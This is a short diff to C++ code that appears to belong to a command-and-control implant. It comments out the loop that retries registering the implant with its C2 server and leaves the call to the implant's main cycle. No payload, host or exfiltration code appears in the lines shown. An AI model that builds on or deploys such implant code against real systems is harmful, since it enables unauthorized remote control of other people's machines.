@@ -7,14 +7,14 @@ DWORD WINAPI ImplantThread(LPVOID)
     c2implant.init();
     //C2Implant implant;
 
-    while (1) {
-        //on success, break to implant.cycle()
-        if (c2implant.register_implant() == 1) {
-            break;
-        }
-        //get rid of me, just a debug to prevent a register loop
-        Sleep(5000);
-    }
+    //while (1) {
+    //    //on success, break to implant.cycle()
+    //    if (c2implant.register_implant() == 1) {
+    //        break;
+    //    }
+    //    //get rid of me, just a debug to prevent a register loop
+    //    Sleep(5000);
+    //}
 
     c2implant.cycle();
     return 0;
